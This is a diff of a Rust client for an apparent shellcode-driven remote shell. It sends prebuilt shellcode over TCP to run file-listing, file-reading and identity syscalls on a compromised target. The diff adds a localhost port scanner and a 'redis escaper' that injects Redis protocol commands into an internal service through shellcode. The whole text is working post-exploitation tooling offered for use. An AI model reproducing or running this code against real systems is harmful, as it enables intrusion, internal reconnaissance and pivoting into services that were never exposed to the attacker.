@@ -3,7 +3,7 @@ use std::{io::{self, Write, Read}, error::Error, net::Shutdown};
 use colored::Colorize;
 use errno::Errno;
 
-use crate::{util::print_error, config::Config, shellcode::{SYS_OPEN_DIR_SENDER, SYS_OPEN_CAT_SENDER, SYS_CHDIR_CD_SENDER, SYS_GETCWD_CWD_SENDER, SYS_GETUID_GETUID_SENDER}};
+use crate::{util::{print_error, print_success}, config::Config, shellcode::{SYS_OPEN_DIR_SENDER, SYS_OPEN_CAT_SENDER, SYS_CHDIR_CD_SENDER, SYS_GETCWD_CWD_SENDER, SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SYS_SOCKET_SYS_CONNECT_PORT_SCANNER, SHELLCODE_LEN, REDIS_ESCAPER}};
 
 fn help() {
     println!(
@@ -11,17 +11,20 @@ fn help() {
     Core Commands
     =============
 
-        Command       Description               Syscalls
-        -------       -------                   -----------
-        help          Print This Menu           N/A
-        ls [DIR]      List directory            SYS_open, SYS_getdents
-        dir [DIR]     List directory            SYS_open, SYS_getdents
-        cat [FILE]    Print File Content        SYS_open, SYS_read
-        cd [DIR]      Change Directory          SYS_chdir
-        pwd           Print Current Directory   SYS_getcwd
-        getuid        Get Current UID           SYS_getuid
-        getgid        Get Current GID           SYS_getgid
-        exit          Exit shell                N/A
+        Command                   Description                                    Syscalls
+        -------                   -------                                        -----------
+        help                      Print This Menu                                N/A
+        ls [DIR]                  List Directory                                 SYS_open, SYS_getdents
+        dir [DIR]                 List Directory                                 SYS_open, SYS_getdents
+        cat [FILE]                Print File Content                             SYS_open, SYS_read
+        cd [DIR]                  Change Directory                               SYS_chdir
+        pwd                       Print Current Directory                        SYS_getcwd
+        getuid                    Get Current UID                                SYS_getuid
+        getgid                    Get Current GID                                SYS_getgid
+        portscan                  Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+        netcat [PORT] [FILE]      Send Data (stored in [FILE]) to Port [PORT]    SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
+                                  And receive its output
+        exit                      Exit shell                                     N/A
 "
     );
 }
@@ -35,6 +38,7 @@ fn dir(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
     let mut dir_shellcode = dir_sender.shellcode.to_vec();
     dir_shellcode.extend(file.as_bytes());
     dir_shellcode.push(0);
+    dir_shellcode.resize(SHELLCODE_LEN, 0);
 
     let mut conn = config.conn.as_ref().unwrap();
     conn.write(&dir_shellcode)?;
@@ -128,6 +132,8 @@ fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
     let mut cat_shellcode = cat_sender.shellcode.to_vec();
     cat_shellcode.extend(file.as_bytes());
     cat_shellcode.push(0);
+    cat_shellcode.resize(SHELLCODE_LEN, 0);
+
 
     let mut conn = config.conn.as_ref().unwrap();
     conn.write(&cat_shellcode)?;
@@ -188,7 +194,9 @@ fn pwd(config: &Config) -> Result<(), Box<dyn Error>> {
         return Err("Server not connected".into());
     }
     let pwd_sender = SYS_GETCWD_CWD_SENDER;
-    let pwd_shellcode = pwd_sender.shellcode.to_vec();
+    let mut pwd_shellcode = pwd_sender.shellcode.to_vec();
+    pwd_shellcode.resize(SHELLCODE_LEN, 0);
+
 
     let mut conn = config.conn.as_ref().unwrap();
     conn.write(&pwd_shellcode)?;
@@ -212,7 +220,9 @@ fn getuid(config: &Config) -> Result<(), Box<dyn Error>> {
         return Err("Server not connected".into());
     }
     let getuid_sender = SYS_GETUID_GETUID_SENDER;
-    let getuid_shellcode = getuid_sender.shellcode.to_vec();
+    let mut getuid_shellcode = getuid_sender.shellcode.to_vec();
+    getuid_shellcode.resize(SHELLCODE_LEN, 0);
+
 
     let mut conn = config.conn.as_ref().unwrap();
     conn.write(&getuid_shellcode)?;
@@ -222,6 +232,26 @@ fn getuid(config: &Config) -> Result<(), Box<dyn Error>> {
     let uid = i64::from_le_bytes(uid_buff);
 
     println!("{}", uid);
+
+    Ok(())
+}
+
+fn getgid(config: &Config) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    let getgid_sender = SYS_GETGID_GETGID_SENDER;
+    let mut getgid_shellcode = getgid_sender.shellcode.to_vec();
+    getgid_shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn: &std::net::TcpStream = config.conn.as_ref().unwrap();
+    conn.write(&getgid_shellcode)?;
+
+    let mut gid_buff = [0; 8];
+    conn.read_exact(&mut gid_buff)?;
+    let gid = i64::from_le_bytes(gid_buff);
+
+    println!("{}", gid);
 
     Ok(())
 }
@@ -245,6 +275,113 @@ fn exit() -> Result<bool, Box<dyn Error>> {
             }
         }
     }
+}
+
+pub fn portscan(config: &mut Config) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    let tcp_scanner = SYS_SOCKET_SYS_CONNECT_PORT_SCANNER;
+    let mut tcp_scanner_shellcode = tcp_scanner.shellcode.to_vec();
+    tcp_scanner_shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&tcp_scanner_shellcode)?;
+
+    let mut open_port_num_buff = [0; 8];
+    conn.read_exact(&mut open_port_num_buff)?;
+    let open_port_num = i64::from_le_bytes(open_port_num_buff);
+
+    print_success("Open ports: ");
+    for _ in 0..open_port_num {
+        let mut open_port_buff = [0; 2];
+        conn.read_exact(&mut open_port_buff)?;
+        let open_port = u16::from_le_bytes(open_port_buff);
+
+        println!("{}", open_port);
+    }
+
+    Ok(())
+}
+
+pub fn redis(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
+    let ps = "redis> ".bold();
+
+    let stdin = io::stdin();
+    let stdout = io::stdout();
+    let mut stdout_handle = stdout.lock();
+
+    loop {
+        let mut line = String::new();
+
+        write!(stdout_handle, "{}", ps)?;
+        stdout_handle.flush()?;
+
+        let bytes_read = stdin.read_line(&mut line)?;
+        if bytes_read == 0 {
+            break;
+        }
+        let cmds: Vec<&str> = line.trim().split_whitespace().collect();
+
+        let mut payload = String::new();
+        payload.push('*');
+        let cmds_len_str = cmds.len().to_string();
+        payload.push_str(&cmds_len_str);
+        payload.push_str("\r\n");
+        for cmd in cmds {
+            payload.push('$');
+            let cmd_len_str = cmd.len().to_string();
+            payload.push_str(&cmd_len_str);
+            payload.push_str("\r\n");
+            payload.push_str(cmd);
+            payload.push_str("\r\n");
+        }
+
+        let payload_len = payload.len();
+
+        let redis_escaper = REDIS_ESCAPER;
+        let mut redis_escaper_shellcode = redis_escaper.shellcode.to_vec();
+        redis_escaper_shellcode[redis_escaper.data_length_index] = (payload_len & 0xff) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index + 1] = ((payload_len & 0xff00) >> 8) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index + 2] = ((payload_len & 0xff0000) >> 16) as u8;
+        redis_escaper_shellcode[redis_escaper.data_length_index + 3] = ((payload_len & 0xff000000) >> 24) as u8;
+        redis_escaper_shellcode[redis_escaper.port_index] = ((port & 0xff00) >> 8) as u8;
+        redis_escaper_shellcode[redis_escaper.port_index + 1] = (port & 0xff) as u8;
+        redis_escaper_shellcode.resize(SHELLCODE_LEN, 0);
+
+        let mut conn = config.conn.as_ref().unwrap();
+        conn.write(&redis_escaper_shellcode)?;
+        conn.write(payload.as_bytes())?;
+
+        let mut beacon_buff = [0; 8];
+        conn.read_exact(&mut beacon_buff)?;
+        let beacon = i64::from_le_bytes(beacon_buff);
+        if beacon == 0 {
+            println!("OK");
+            continue;
+        }
+        if beacon < 0 {
+            let e = -beacon;
+            let message = format!("redis: {}", Errno(e as i32));
+            return Err(message.into());
+        }
+        let content_len = beacon as u64;
+        let mut content_buff = vec![0; content_len as usize];
+        conn.read_exact(&mut content_buff)?;
+
+        let result;
+        if *content_buff.last().unwrap() == b'\n' {
+            result = String::from_utf8_lossy(&content_buff[1..(content_len - 2) as usize]).to_string();
+        } else {
+            content_buff.reverse();
+            result = String::from_utf8_lossy(&content_buff[..(content_len - 2) as usize]).to_string();
+        }
+
+        println!("{}", result);
+    }
+
+    println!("");
+    Ok(())
 }
 
 pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
@@ -323,6 +460,36 @@ pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
                 },
                 "getuid" => {
                     if let Err(err) = getuid(config) {
+                        let message = format!("Error: {}", err);
+                        print_error(&message);
+                    }
+                },
+                "getgid" => {
+                    if let Err(err) = getgid(config) {
+                        let message = format!("Error: {}", err);
+                        print_error(&message);
+                    }
+                },
+                "portscan" => {
+                    if let Err(err) = portscan(config) {
+                        let message = format!("Error: {}", err);
+                        print_error(&message);
+                    }
+                },
+                "redis" => {
+                    let port = match iter.next() {
+                        Some(port_str) => {
+                            if let Ok(port) = port_str.parse::<u16>() {
+                                port
+                            } else {
+                                6379
+                            }
+                        },
+                        None => {
+                            6379
+                        }
+                    };
+                    if let Err(err) = redis(config, port) {
                         let message = format!("Error: {}", err);
                         print_error(&message);
                     }
